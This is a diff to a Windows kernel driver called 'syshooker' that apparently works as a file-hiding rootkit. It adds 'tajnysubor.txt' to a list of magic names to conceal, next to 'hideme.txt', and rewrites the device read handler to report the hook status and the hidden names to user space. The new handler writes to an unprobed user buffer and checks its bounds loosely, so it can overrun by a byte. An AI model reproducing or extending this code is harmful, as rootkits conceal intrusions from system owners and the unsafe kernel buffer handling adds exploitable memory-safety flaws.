@@ -71,6 +71,9 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	NameNode* FileHead = CreateNameNode(L"hideme.txt", 10);
 	SettingsNew.ProcessMagicNamesHead = ProcessHead;
 	SettingsNew.FileMagicNamesHead = FileHead;
+	// add another file
+	FileHead = CreateNameNode(L"tajnysubor.txt", 14);
+	SettingsNew.FileMagicNamesHead->Next = FileHead;
 
 	// IRP Routines
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = SyshookerCreateClose;
@@ -438,13 +441,14 @@ NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
 
 	do {
-		if (irpSp->Parameters.Read.Length < 1024) {
-			status = STATUS_BUFFER_TOO_SMALL;
-			kprintf("[-] syshooker IRQ_READ: Buffer too small\n");
+		ULONG BufferSizeBytes = irpSp->Parameters.Read.Length;
+		if (BufferSizeBytes < 1) {
+			status = STATUS_INVALID_PARAMETER;
+			kprintf("[-] syshooker IRQ_READ: Buffer length 0.\n");
 			break;
 		}
 
-		// make data buffer accessible
+		// char buffer of the userspace data
 		char* data = static_cast<char*>(Irp->UserBuffer);
 
 		// check nullptr
@@ -454,12 +458,51 @@ NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
+		
+		// first byte - current syshooker status
+		data[0] = CALLBACK_OVERWRITE_ENABLED;
+		information++;
 
-		for (char i = 0; i < 10; ++i) {
-			data[i] = 'A' + i;
-			information++;
+		// iterate over magicNames linked lists and populate the buffer with the NodeNames
+		wchar_t* OutputBuffer = (wchar_t*)(data + 1);
+		
+		// magic files
+		NameNode* CurrentNameNode = SettingsNew.FileMagicNamesHead;
+		while (CurrentNameNode != nullptr && information < BufferSizeBytes) {
+			if (CurrentNameNode->NameBuffer) {
+				kprintf("[+] syshooker IRQ_READ: Adding to buffer: %ws\n", CurrentNameNode->NameBuffer);
+				size_t index = 0;
+				while (CurrentNameNode->NameBuffer[index] != L'\0' && information < BufferSizeBytes) { // we guarantee NULL-termination
+					kprintf("Ptr: %p, char: %wc, information: %d\n", OutputBuffer, CurrentNameNode->NameBuffer[index], information);
+					*OutputBuffer = CurrentNameNode->NameBuffer[index];
+					OutputBuffer++; // move further in the buffer
+					information += sizeof(wchar_t); // increment byte size used
+					index++;
+				}
+				if (information < BufferSizeBytes) {
+					// add '\' instead of \0 
+					*OutputBuffer = L'\\';
+					OutputBuffer++;
+					information += sizeof(wchar_t);
+				}
+				else {
+					status = STATUS_BUFFER_TOO_SMALL;
+					break;
+				}
+			}
+
+			if (information >= BufferSizeBytes) break; // do not continue if the output buffer is full
+			
+			// move to the next NameNode
+			CurrentNameNode = CurrentNameNode->Next;
 		}
-		kprintf("[+] syshooker IRQ_READ: Buffer after population: %s\n", data);
+		if (information >= BufferSizeBytes) break; // do not continue if the output buffer is full
+		*OutputBuffer = L'\0';
+		OutputBuffer++;
+		information += sizeof(wchar_t);
+
+		// TODO - ProcessNames
+		// RegistryNames
 
 	} while (FALSE);
 
